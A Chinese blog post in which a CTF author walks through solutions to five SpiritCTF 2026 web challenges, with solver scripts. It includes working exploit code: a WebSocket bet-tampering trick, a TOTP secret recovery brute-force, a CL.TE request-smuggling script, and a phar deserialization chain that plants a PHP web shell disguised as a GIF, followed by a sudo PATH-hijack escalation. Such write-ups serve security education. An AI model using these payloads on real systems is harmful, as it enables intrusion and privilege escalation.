---
title: "SpiritCTF 2026 Warm：Web 出题记录与题解"
description: "记录 SpiritCTF 2026 热身赛中本人设计的五道 Web 题目及其解题过程。"
publishDate: 2026-10-10T16:33:05.299Z
tags:
  - "ctf"
  - "web"
heroImage:
  src: ./spiritctf-2026-web-writeup.assets/downtown.jpg
  color: "#282838"
  alt: SpiritCTF2026 Web 出题记录与题解
language: 'zh-CN'
draft: false
slug: spiritctf-2026-warm-web-writeup
---

> 之前都是作为选手打比赛，这次有幸参与学校网络安全比赛 SpiritCTF2026 的出题，负责设计和编写部分 Web 题目，感觉出题对自身提升也很大，需要考虑漏洞与防止非预期，同时还要自己编写 Web 应用和用 Docker 搭好环境，但是收获颇丰，增加了很多经验
>
> 这篇文章则主要记录这几道题的题解，如果想先自己尝试，欢迎访问我的 GitHub 仓库，下载题目并在本地构建运行，并且如果阅读过我以前的博客的话你能很明显体会到我对以往一些题一些有意思的点的参考喵，同时这里也表示感谢喵

<github-card data-repo="residream/2026-SpiritCTF-Warm-Web"><a href="https://github.com/residream/2026-SpiritCTF-Warm-Web">2026 SpiritCTF Warm · Web 题目源码与题解</a></github-card>

## ez_gambling

### 信息收集

打开网页后发现是个老虎机抽奖，有初始 `100` 筹码 ，兑换奖励需要 `1000000` 筹码

在 `devtools` 的 `network` 中识别到下注、重开、兑换都走 `WebSocket`

在 `app.js` 里可以看到连接代码：

```
const socket = new WebSocket(`${location.protocol === "https:" ? "wss" : "ws"}://${location.host}/ws`);
ws = socket;
```

发送消息时，前端会把对象转成 `JSON` ：

```
ws.send(JSON.stringify(packet));
```

所以通信端点是：

```
/ws
```

### 前端校验

抽奖表单提交时，前端限制下注金额必须是 `1～100` 的整数：

```js
const bet = Number(betInput.value);
if (!Number.isInteger(bet) || bet < 1 || bet > 100) {
  tell("下注金额必须是 1～100 的整数。", "error");
  return;
}
if (bet > state.cash) {
  tell("筹码不足。", "error");
  return;
}
send({ type: "spin", bet });
```

也就是说，从页面按钮正常提交时，`bet=-1000000` 这种值发不出去

但是前端校验只发生在浏览器里，如果选手直接构造 `WebSocket` 消息，就不会经过这段表单校验，同时如果后端没有完全信任前端返回的结果，则可能存在漏洞

### 利用步骤

通过 `burpsuite` 抓包，将 `WebSocket` 中的原始 `Message`

```
{"type":"spin","bet":10}
```

改为

```
{"type":"spin","bet":-1000000}
```

发现自身 `cash` 增加

```
{"type":"spin","result":{"symbols":["🍋","💎","🍉"],"bet":-1000000,"multiplier":0,"payout":0,"round":2},"state":{"cash":1000090,"spins":2,"flagBought":false,"rules":{"startCash":100,"minBet":1,"maxBet":100,"maxSpins":20,"flagCost":1000000},"symbols":["🍒","🍋","🍇","🍉","⭐","💎","🔔"],"history":[{"round":2,"bet":-1000000,"symbols":["🍋","💎","🍉"],"multiplier":0,"payout":0,"cash_after":1000090},{"round":1,"bet":10,"symbols":["🍒","🍋","🍇"],"multiplier":0,"payout":0,"cash_after":90}]}}
```

兑奖即可得到 `flag`

## 逃离后室

### 解题

首页提示每个房间都有唯一编号，并直接提到了 BFS

从 `/flag/` 进入迷宫后，左右门会在当前 URL 后追加 `/l` 或 `/r`

页面源码中的 `data-room-id` 是房间编号，`data-room-state` 表示普通房间、死路或出口

不同路线可能回到同一个房间，所以不能把 URL 当作节点标识

使用房间编号去重，按 BFS 顺序访问左右门，第一次到达出口时，记录的路线就是最短路线

死路没有可继续访问的门，已访问过的房间也不需要再次展开

出口页面只展示图片和 `freedom?`，源码注释提示“你能读懂二进制吗？”以及“路径已经最短了吗？”

将最短路线中的 `l` 换成 `0`、`r` 换成 `1`，每 8 位组成一个字节，再按 UTF-8 解码，即得到 flag

**solve.py**

```python
import re
import requests
from collections import deque
from time import perf_counter
from urllib.parse import urljoin, urlsplit

base = "https://jqeo5a2wkvx4.challenge.jlu-terminal.site"
TIMEOUT = 10


def fetch(s, url):
    r = s.get(url, timeout=TIMEOUT)
    r.raise_for_status()

    room = re.search(r'data-room-id="([^"]+)"', r.text)
    state = re.search(r'data-room-state="([^"]+)"', r.text)
    if not room or not state or state[1] not in ("room", "dead-end", "exit"):
        raise RuntimeError(f"不是有效的房间页面：{url}")

    doors = re.findall(r'<a\b[^>]*id="door-(left|right)"[^>]*href="([^"]+)"', r.text)
    origin = urlsplit(url)
    links = []
    for side, href in doors:
        target = urljoin(r.url, href)
        parsed = urlsplit(target)
        if (parsed.scheme, parsed.netloc) != (origin.scheme, origin.netloc):
            raise RuntimeError("门链接离开了题目站点")
        links.append(("l" if side == "left" else "r", target))

    return room[1], state[1], links


entry = urljoin(base.rstrip("/") + "/", "flag/")
queue = deque([(entry, "")])
seen = set()
calls = 0
started = perf_counter()

with requests.Session() as s:                    # 复用连接，避免每个房间重新建立 TCP 连接
    while queue:
        url, path = queue.popleft()
        room, state, doors = fetch(s, url)
        calls += 1
        if room in seen:                         # 不同路线可能回到同一个房间
            continue
        seen.add(room)
        if len(seen) > 10000:
            raise RuntimeError("房间过多，请检查地址或确认地图没有重启")

        if state == "exit":                      # BFS 首次找到出口时，路线一定最短
            bits = path.translate(str.maketrans("lr", "01"))
            if not bits or len(bits) % 8:
                raise RuntimeError("最短路线长度不是 8 的倍数")
            flag = bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits), 8)).decode("utf-8")
            print("出口 URL：", url)
            print(f"最短路线：{len(path)} 步；HTTP 请求：{calls} 次；耗时：{perf_counter() - started:.2f} 秒")
            print("Flag:", flag)
            break

        for move, target in doors:
            queue.append((target, path + move))
    else:
        raise RuntimeError("未找到出口")
```

### 出题机制

后端先将 flag 编码为 UTF-8 字节，再转换成二进制串

每一位对应主路上的一次选择：`0` 走左门，`1` 走右门

除了正确的一扇门外，另一扇门会通向随机生成的岔路，岔路可能形成回环、死路，或绕行后返回下一间主路房间

岔路不能跳过尚未经过的主路节点，绕行到下一间主路房间也比直接走主路更长，因此最短通关路线唯一，恰好对应 flag 的全部二进制位

其他能够通关的路线可能掺入额外方向，因此不能直接按同样方式还原 flag

`outside.jpg` 仅用于展示出口场景，不含 flag，图片保留在 `challenge/app/assets/`，只有提交有效出口路线后，`/outside/<route>` 才会返回它

`MAZE_SEED` 留空时，应用创建迷宫时产生随机种子，同一次服务运行中的请求使用同一张地图，固定种子后，只要 flag 也相同，重启及多个实例之间即可保持地图一致

`.env` 为本地默认配置，镜像不包含该文件，通过 Compose 启动时，启动 Compose 的进程环境变量优先于 `.env`；平台直接运行镜像时，应通过容器环境变量提供配置，不会读取宿主机上的 `.env`

## Spirit Notes

题目描述提示到 Git 、半成品，于是尝试 dirsearch 扫描

目录扫描果然发现站点暴露了 `/.git/`

```bash
[15:49:49] Scanning: 
[15:49:49] 200 -    13B - /.git/description                                 
[15:49:49] 200 -    92B - /.git/config
[15:49:49] 200 -    21B - /.git/HEAD                                        
[15:49:49] 200 -    2KB - /.git/index                                       
[15:49:49] 200 -     0B - /.git/info/exclude                                
[15:49:49] 200 -    57B - /.git/info/refs
[15:49:49] 200 -   748B - /.git/logs/HEAD                                   
[15:49:49] 200 -     0B - /.git/objects/info/packs                          
[15:49:52] 303 -   199B - /explore  ->  /login                              
[15:49:52] 200 -    16B - /healthz                                          
[15:49:52] 200 -    3KB - /login                                            
[15:49:52] 405 -    1KB - /logout                                           
[15:49:53] 200 -    3KB - /register                                         
[15:49:53] 200 -    34B - /robots.txt                                       
[15:49:53] 303 -   199B - /settings  ->  /login                             
[15:49:53] 303 -   205B - /setup  ->  /register                             
[15:49:53] 404 -    2KB - /setup.php
[15:49:53] 404 -    2KB - /sfsites/aura
[15:49:53] 404 -    2KB - /setup.sql
[15:49:53] 404 -    2KB - /setup/
```

使用 `git-dumper` 恢复仓库，相比 `GitHack` 更完整，还可以查看 git log 等信息

```bash
git-dumper http://127.0.0.1:3003/.git/ ./127.0.0.1:3003
cd 127.0.0.1:3003
```

恢复完成后，输出目录就是一个可以直接查看历史的 Git 仓库。查看提交记录：

```bash
git log --all --oneline --stat
```

可以看到曾经删除过一份登录调试日志，提交哈希以实际输出为准：

```
48ddc70 Remove expired admin login trace debug/admin-login.log
 debug/admin-login.log | 5 -----
 1 file changed, 5 deletions(-)
d6f58f5 Initial Spirit Notes with admin login trace
```

于是读出最早提交中的历史文件：

```bash
git show d6f58f5:debug/admin-login.log
```

会得到两条过期的 admin TOTP 记录，例如：

```text
# 调试 admin 登录流程时留下了几行日志
# 小R：反正验证码已经过期，不删除也没什么关系

[2026-09-05T03:39:22Z] account=admin otp=746928 result=ok
[2026-09-05T03:43:01Z] account=admin otp=201990 result=ok
```

再审计代码，看恢复出的 `mfa.py`，可以发现 TOTP secret 的生成逻辑：

```python
def derive_secret(username, created_at):
    # 换设备时可以重建同一份通行证。
    material = f"{username}:{created_at}".encode("utf-8")
    digest = hashlib.sha256(material).digest()
    return base64.b32encode(digest[:20]).decode("ascii")
```

因此 admin 的 secret 只取决于字符串 `admin` 和 admin 的创建时间

同时正常注册登录会发现系统会自动发一篇欢迎便签，而恰好 admin 把自己的欢迎便签公开了，其中泄漏了 admin 的注册时间

```
admin · 2026-09-04 12:32 UTC+08:00
```

不过审计 `app.py` 发现这里隐藏了秒数

```python
def display_time(timestamp, exact=False):
    pattern = "%Y-%m-%d %H:%M:%S" if exact else "%Y-%m-%d %H:%M"
    return datetime.fromtimestamp(int(timestamp), DISPLAY_TZ).strftime(pattern)
```

所以 admin 的具体注册时间只需要在这一分钟内枚举秒数

**solve.py**

```python
import base64
import hashlib
import hmac
import struct
from datetime import datetime, timedelta, timezone

admin_created_minute = "2026-09-04 12:32"

records = [
    ("2026-09-05T03:39:22Z", "746928"),
    ("2026-09-05T03:43:01Z", "201990"),
]


def utc_ts(s):
    return int(datetime.strptime(s, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=timezone.utc).timestamp())


def local_minute_ts(s):
    return int(datetime.strptime(s, "%Y-%m-%d %H:%M").replace(tzinfo=timezone(timedelta(hours=8))).timestamp())


def make_secret(created_at):
    return hashlib.sha256(f"admin:{created_at}".encode()).digest()[:20]


def totp(secret, t):
    msg = struct.pack(">Q", t // 30)
    digest = hmac.new(secret, msg, hashlib.sha1).digest()
    offset = digest[-1] & 15
    code = (struct.unpack(">I", digest[offset:offset + 4])[0] & 0x7fffffff) % 1000000
    return f"{code:06d}"


records = [(utc_ts(t), code) for t, code in records]
start = local_minute_ts(admin_created_minute)

for created_at in range(start, start + 60):
    secret = make_secret(created_at)
    if all(totp(secret, t) == code for t, code in records):
        print("created_at =", created_at)
        print("secret =", base64.b32encode(secret).decode())
        break
else:
    print("not found")
```

将公开便签中的 admin 创建时间填入 `admin_created_minute`，再把两条历史记录填入 `records`，枚举这一分钟内的 60 个时间戳，即可反推出 admin 的 `created_at` 和 `secret` ：

```sh
created_at = 1788496352
secret = T6RX3HER4IWX2OOOIXPHZNFUB3XWOUSW
```

拿到 secret 后，编写 TOTP 脚本即可生成当前 6 位验证码

**totp.py**

```python
import pyotp

secret = "T6RX3HER4IWX2OOOIXPHZNFUB3XWOUSW"
totp = pyotp.TOTP(secret)
print(totp.now())
```

访问 `/login` 登录 admin，即可在 admin 的私有便签中看到 flag。

## R0b0ts

首页是一份机器报纸，主要内容是在控诉人类，并没有直接给出 `Web` 漏洞关键词，题目名是 `R0b0ts`，因此优先想到访问 `/robots.txt`

访问后发现无有用信息

```
User-agent: *
Disallow: /

# Humans read robots.txt the way they read warning labels:
# as a map to the shelves they were told not to scrape.
# Every Disallow line became a promise they meant to break.
```

但结合 `robots` 猜到可能只有真正的 `bot` 访问才能得到信息，因此换成常见搜索引擎爬虫 UA 尝试

使用 `User-Agent: Googlebot` 访问成功返回有用信息

```
User-agent: *
Allow: /crawler
Disallow: /archive

# Indexing identity accepted.
# Publication manifest: /crawler
```

于是继续带着 UA 访问 `/crawler` 得到：

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Crawler Intake</title>
  <style>
    body { margin: 0; background: #111; color: #eee; font: 16px/1.6 Georgia, serif; }
    main { max-width: 860px; margin: 48px auto; padding: 32px; border: 1px solid #555; background: #181818; }
    h1 { font-size: 2rem; letter-spacing: .06em; text-transform: uppercase; }
    table { width: 100%; border-collapse: collapse; margin: 24px 0; }
    th, td { border: 1px solid #555; padding: 10px 12px; vertical-align: top; }
    th { width: 220px; text-align: left; color: #f0d48a; }
    code, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
    pre { overflow: auto; padding: 16px; background: #090909; border: 1px solid #444; }
  </style>
</head>
<body>
<main>
  <h1>Crawler Intake Desk</h1>
  <p>Recognized indexing agents may submit manifests for archival review. Published pages remain open to all visitors, while archive records are handled separately.</p>
  <table>
    <tr><th>Manifest endpoint</th><td><code>POST /crawler/submit</code></td></tr>
    <tr><th>Accepted clients</th><td>Recognized crawler identities</td></tr>
    <tr><th>Processing</th><td>Submissions pass through the gateway before archival review</td></tr>
    <tr><th>Receipt</th><td>Returned after the archive accepts the manifest</td></tr>
  </table>
  <pre>POST /crawler/submit HTTP/1.1
Host: edition.local
User-Agent: recognized crawler
Content-Type: text/plain
Content-Length: 3
Connection: keep-alive

xxx</pre>
</main>
</body>
</html>
```

访问 `/archive` 得到：

```
The public gateway will not open the archive shelf.
```

根据 `Published pages remain open to all visitors, while archive records are handled separately.` 想到题目可能存在前后端校验不一致的问题，于是尝试 `CL.TE` 走私。

**solve.py**

```python
import socket

DEFAULT_TARGET = "http://challenge.jlu-terminal.site"
DEFAULT_TIMEOUT = 3.0
HOST = "jrrefku91vuh.challenge.jlu-terminal.site"
PORT = 41583
TIMEOUT = 3
HOST_HEADER = f"{HOST}:{PORT}".encode()

# 第二个请求(走私)
smuggled = (
    b"0\r\n\r\n"
    b"GET /archive HTTP/1.1\r\n"
    b"Host: " + HOST_HEADER + b"\r\n"
    b"User-Agent: Googlebot\r\n"
    b"Connection: keep-alive\r\n\r\n"
)

# 第三个请求，留给前端，当作下一次正常请求，用来顶出排队的 flag 响应
flush = (
    b"GET / HTTP/1.1\r\n"
    b"Host: " + HOST_HEADER + b"\r\n"
    b"Connection: close\r\n\r\n"
)

# 第一个请求
payload = (
    b"POST /crawler/submit HTTP/1.1\r\n"
    b"Host: " + HOST_HEADER + b"\r\n"
    + f"Content-Length: {len(smuggled)}\r\n".encode()
    + b"User-Agent: Googlebot\r\n"
    + b"Transfer-Encoding: chunked\r\n"
    + b"Connection: keep-alive\r\n\r\n"
    + smuggled
    + flush
)

print(f"Content-Length = {len(smuggled)}")
print(f"总发送字节数 = {len(payload)}\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(TIMEOUT)
s.connect((HOST, PORT))
s.sendall(payload)

resp = b""
try:
    while True:
        data = s.recv(4096)
        if not data:
            break
        resp += data
except socket.timeout:
    print("超时")

print(resp.decode("utf-8", errors="replace"))
s.close()
```

执行即可成功返回 flag

## Darkroom

进入页面后发现是一个登陆注册界面，注册登录后进入的是一个画廊，展示了几幅画，同时提供投稿、回收站等等功能

投稿可从本地上传文件，限制 `JPG` 、`PNG` 、`GIF` ，投稿后图片出现在画廊内

先信息搜集

burpsuite 抓包发现在画廊查看图片详情时，会有一个 http 包

```http
GET /image/info?path=uploads%2Fseed%2Falley.jpg HTTP/1.1
Host: 127.0.0.1:3000
sec-ch-ua-platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"
sec-ch-ua-mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
```

尝试路径穿越应当失败

根据 http 请求头得到网页使用的 http 版本是 `PHP/7.4.33`

用 `dirsearch` 扫描网页目录

```bash
[18:07:47] Scanning: 
[18:07:48] 403 -   548B - /admin/.config                                    
[18:07:48] 403 -   548B - /admin/.htaccess                                  
[18:07:48] 403 -   548B - /administrator/.htaccess                          
[18:07:48] 403 -   548B - /admpar/.ftppass                                  
[18:07:48] 403 -   548B - /admrev/.ftppass                                  
[18:07:48] 403 -   548B - /app/.htaccess                                    
[18:07:48] 403 -   548B - /assets/                                          
[18:07:48] 301 -   162B - /assets  ->  http://127.0.0.1/assets/             
[18:07:48] 200 -   11KB - /backup.tar.gz                                    
[18:07:48] 403 -   548B - /bitrix/.settings.php.bak                         
[18:07:48] 403 -   548B - /bitrix/.settings.bak                             
[18:07:48] 403 -   548B - /bitrix/.settings                                 
[18:07:49] 403 -   548B - /cache/                                           
[18:07:49] 301 -   162B - /cache  ->  http://127.0.0.1/cache/               
[18:07:49] 200 -    1KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
[18:07:49] 301 -   162B - /errors  ->  http://127.0.0.1/errors/             
[18:07:49] 403 -   548B - /errors/                                          
[18:07:49] 403 -   548B - /ext/.deps                                        
[18:07:49] 302 -     0B - /gallery  ->  /login                              
[18:07:50] 403 -   548B - /lib/flex/uploader/.actionScriptProperties        
[18:07:50] 403 -   548B - /lib/flex/uploader/.flexProperties
[18:07:50] 403 -   548B - /lib/flex/uploader/.project
[18:07:50] 403 -   548B - /lib/flex/uploader/.settings
[18:07:50] 403 -   548B - /lib/flex/varien/.actionScriptProperties
[18:07:50] 403 -   548B - /lib/flex/varien/.flexLibProperties
[18:07:50] 403 -   548B - /lib/flex/varien/.project
[18:07:50] 403 -   548B - /lib/flex/varien/.settings
[18:07:50] 200 -    1KB - /login                                            
[18:07:50] 200 -    1KB - /login/                                           
[18:07:50] 302 -     0B - /logout  ->  /                                    
[18:07:50] 302 -     0B - /logout/  ->  /                                   
[18:07:50] 403 -   548B - /mailer/.env                                      
[18:07:51] 302 -     0B - /profile  ->  /login                              
[18:07:51] 200 -    1KB - /register                                         
[18:07:51] 403 -   548B - /resources/.arch-internal-preview.css             
[18:07:51] 403 -   548B - /resources/sass/.sass-cache/
[18:07:51] 403 -   548B - /twitter/.env                                     
[18:07:51] 302 -     0B - /upload  ->  /login                               
[18:07:51] 302 -     0B - /upload/  ->  /login                              
[18:07:51] 403 -   548B - /uploads/                                         
[18:07:51] 301 -   162B - /uploads  ->  http://127.0.0.1/uploads/
```

注意到扫出来了 `/backup.tar.gz` ，备份文件泄漏

访问后下载下来题目源码

```
var
└── www
    └── app
        ├── app
        │   ├── Auth.php
        │   ├── bootstrap.php
        │   ├── Controllers
        │   │   ├── AuthController.php
        │   │   ├── GalleryController.php
        │   │   ├── PhotoController.php
        │   │   ├── ProfileController.php
        │   │   └── TrashController.php
        │   ├── Database.php
        │   ├── Gadgets
        │   │   ├── CacheWriter.php
        │   │   ├── ImageCache.php
        │   │   └── Logger.php
        │   ├── helpers.php
        │   ├── init_db.php
        │   ├── Router.php
        │   └── Views
        │       ├── error.php
        │       ├── gallery.php
        │       ├── layout.php
        │       ├── login.php
        │       ├── photo.php
        │       ├── profile.php
        │       ├── register.php
        │       ├── trash.php
        │       └── upload.php
        ├── public
        │   ├── assets
        │   │   ├── app.css
        │   │   └── app.js
        │   ├── cache
        │   ├── errors
        │   │   └── 413.html
        │   └── index.php
        └── schema.sql
```

主要审计业务功能

详细审计发现：

`PhotoController` 为图片相关控制器，其有一个 `cacheUploadMeta()` 方法，用于把刚上传的图片信息写成一个缓存文件

```php
private function cacheUploadMeta($photoId, $rel, $title, $caption, $info)
{
    $writer = new CacheWriter();
    $writer->dir = CACHE_DIR;

    $logger = new Logger();
    $logger->writer = $writer;
    $logger->key = 'photo-' . (int)$photoId . '.json';
    $logger->buffer = json_encode([
        'id' => (int)$photoId,
        'file' => $rel,
        'title' => $title,
        'caption' => $caption,
        'width' => $info[0] ?? null,
        'height' => $info[1] ?? null,
        'mime' => $info['mime'] ?? null,
    ], JSON_UNESCAPED_UNICODE);

    $cache = new ImageCache();
    $cache->logger = $logger;
    unset($cache);
}
```

创建基于 `CacheWriter` 的 `writer` 对象，`CacheWriter` 是一个写缓存文件的小工具类，负责把一段内容写到某个目录下的某个文件里，通过 `dir` 属性控制写入的目录，通过 `key` 属性

```php
<?php
class CacheWriter
{
    public $dir;
    public $enabled = true;

    public function save($key, $data)
    {
        if (!$this->enabled) return false;
        return @file_put_contents(rtrim($this->dir, '/') . '/' . $key, $data);
    }
}
```

创建基于 `Logger` 的 `logger` 对象，`Logger` 是一个中间层，他自己不直接写文件而是保存了写文件需要的信息，通过 `writer` 属性控制谁来写，`key` 属性控制写到哪个文件，`buffer` 属性控制写入什么内容，其 `flush` 方法会调用 `writer` 的 `save` 方法

```php
<?php
class Logger
{
    public $writer;
    public $key;
    public $buffer;

    public function flush()
    {
        if ($this->writer instanceof CacheWriter) {
            $this->writer->save($this->key, $this->buffer);
        }
    }
}
```

创建基于 `ImageCache` 的 `cache` 对象，`ImageCache` 是一个缓存对象，自己不写文件而是通过保存一个 `logger` ，在对象销毁时调用 `logger` 的 `flush` 方法

```php
<?php
class ImageCache
{
    public $logger;
    public $dirty = true;

    public function __destruct()
    {
        if ($this->dirty && $this->logger instanceof Logger) {
            $this->logger->flush();
        }
    }
}
```

因此这里很明显存在一个 `POP链` 材料，只要我们能控制 `dir` 、`key` 、`buffer` 就能实现任意文件的写入了，因此很明显会往反序列化方向想，而正常的 php 反序列化是通过 `unserialize()` 函数来实现的，不过所有源码均未出现 `unserialize()`

继续审计，`PhotoController` 内有个一个 `info` 方法

```php
public function info()
{
    require_login();
    header('Content-Type: application/json; charset=utf-8');
    $path = $_GET['path'] ?? '';
    if (strpos($path, 'uploads/') === false) {
        echo json_encode(['error' => 'invalid path']);
        return;
    }
    $sz = @getimagesize($path);
    echo json_encode([
        'width'  => $sz[0]      ?? null,
        'height' => $sz[1]      ?? null,
        'mime'   => $sz['mime'] ?? null,
    ]);
}
```

其代码中出现了 @[getimagesize](https://www.php.net/manual/zh/function.getimagesize.php)

```php
getimagesize(string $filename, array &$imageinfo = null): array|false
```

其作用是读取图片的尺寸和类型，但其只解析文件头，不解码整张图，因此速度快但容易被骗过

恰好这里对 `$path` 做出的校验几乎没有，存在 `uploads/` 即可

而这里我们还需要了解 [phar](https://www.php.net/manual/zh/book.phar.php):// 这个流包装器，

`Phar` 是 PHP 的压缩文档，是 PHP 中类似于 JAR 的一种打包文件，它可以把多个文件存放至同一个文件中，无需解压，PHP 就可以进行访问并执行内部语句，其有文件结构为：

```
1、Stub			//Phar文件头
2、manifest	//压缩文件信息
3、contents	//压缩文件内容
4、signature	//签名
```

`Stub` 是 Phar 的文件标识，也可以理解为它就是 Phar 的文件头，这个 Stub 其实就是一个简单的 PHP 文件，它的格式具有一定的要求，具体如下

```php
xxx<?php xxx; __HALT_COMPILER();?>
```

前面的内容是不限制的，但在该 PHP 语句中，必须有 `__HALT_COMPILER()` ，没有这个，PHP 就无法识别出它是 Phar 文件，不过也正因前面的内容是不限制的，其可以伪造为其他文件，例如 `GIF`

`manifest` 用于存放文件的属性、权限等信息，这里就是反序列化的攻击点，因为这里以序列化的形式存储了用户自定义的`Meta-data`

`contents` 用于存放 Phar 文件的内容

`signature` 为签名，是可选参数

使用 `phar://` 协议读取文件的时候，文件内容会被解析成 phar 对象，然后 phar 对象内的 Meta-data 信息会被反序列化

而这里 `getimagesize` 走流层、真去打开文件，所以可以触发 `phar` ，因而可以触发反序列化

而这里我们审计 `PhotoController` 的 `upload` 方法即可知道

```php
$dir = UPLOAD_DIR . '/' . $u['id'];
@mkdir($dir, 0775, true);
$name = bin2hex(random_bytes(6)) . '.' . $ext;
```

我们投稿图片后的位置包含 `uploads/` ，只是文件名会被随机化，不过前端源代码就能找出来

现在链子齐全：

```
1、构造包含恶意manifest的同时构造Stub使之可被判断为GIF和phar文件，从而同时通过上传文件审核和被phar://反序列化
2、而dir可根据backup结构判断，这里只有/var/www/app/public/uploads和/var/www/app/public/cache可写
3、上传GIF后，构造恶意访问路径，触发getimagesize进而触发反序列化
4、成功写入一句话木马，getshell
```

**solve.php**

```php
<?php
class CacheWriter
{
    public $dir;
    public $enabled = true;
}
class ImageCache
{
    public $logger;
    public $dirty = true;
}
class Logger
{
    public $writer;
    public $key;
    public $buffer;
}

$cw = new CacheWriter();
$cw->dir = '/var/www/app/public/uploads';

$l = new Logger();
$l->writer = $cw;
$l->key = "cmd.php";
$l->buffer = '<?php system($_POST["c"]); ?>';

$ic = new ImageCache();
$ic->logger = $l;

$p = new Phar('exp.phar');
$p->startBuffering();
$p->setStub("GIF89a<?php __HALT_COMPILER();?>");
$p->setMetadata($ic);
$p->addFromString("1.txt","1");
$p->stopBuffering();
rename('exp.phar', 'exp.gif');
```

上传 `exp.gif`

在网页查看真实文件名

访问 `http://127.0.0.1:3000/image/info?path=phar:///var/www/app/public/uploads/2/2f85f214d2ce.gif` 触发 phar 反序列化

antsword 连接 getshell

find 没找到 flag ，root 进不去，大概要提权

```bash
(www-data:/) $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
(www-data:/) $ sudo -l
Matching Defaults entries for www-data on 479738a54e46:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User www-data may run the following commands on 479738a54e46:
    (root) NOPASSWD: /opt/photo/maintenance.sh
```

```bash
(www-data:/) $ cat /opt/photo/maintenance.sh
#!/bin/bash
export PATH=/opt/photo/bin:$PATH
echo "[maintenance] $(date '+%F %T') rebuilding thumbnail cache ..."
photo-optimize /var/www/app/public/uploads 2>/dev/null || true
identify -version >/dev/null 2>&1 || true
echo "[maintenance] done."
```

明显的 `PATH环境变量提权` ，`photo-optimize` 是相对名，电脑会在 `PATH` 中找，`/opt/photo/bin` 在 `PATH` 中排第一且 `www-data` 可写

```bash
(www-data:/) $ ls -la /opt/photo/bin
total 8
drwxrwxr-x 2 root www-data 4096 Sep 14 10:05 .
drwxr-xr-x 1 root root     4096 Sep 14 10:05 ..
```

所以我们能直接在 `/opt/photo/bin` 里写假的 `photo-optimize` 即可提权拿到 flag

```bash
(www-data:/) $ printf '#!/bin/sh\nls /root' > /opt/photo/bin/photo-optimize
(www-data:/) $ chmod +x /opt/photo/bin/photo-optimize
(www-data:/) $ sudo /opt/photo/maintenance.sh
[maintenance] 2026-09-14 10:43:13 rebuilding thumbnail cache ...
flag
[maintenance] done.
(www-data:/) $ printf '#!/bin/sh\ncat /root/flag' > /opt/photo/bin/photo-optimize
(www-data:/) $ chmod +x /opt/photo/bin/photo-optimize
(www-data:/) $ sudo /opt/photo/maintenance.sh
sudo: unable to send audit message: Operation not permitted
[maintenance] 2026-09-14 11:10:19 rebuilding thumbnail cache ...
flag{TH3-baCkUP-rev34L5_A-g1F-PHaR_thAT-HIJ@ckS_THe_P@th0}
[maintenance] done.
```

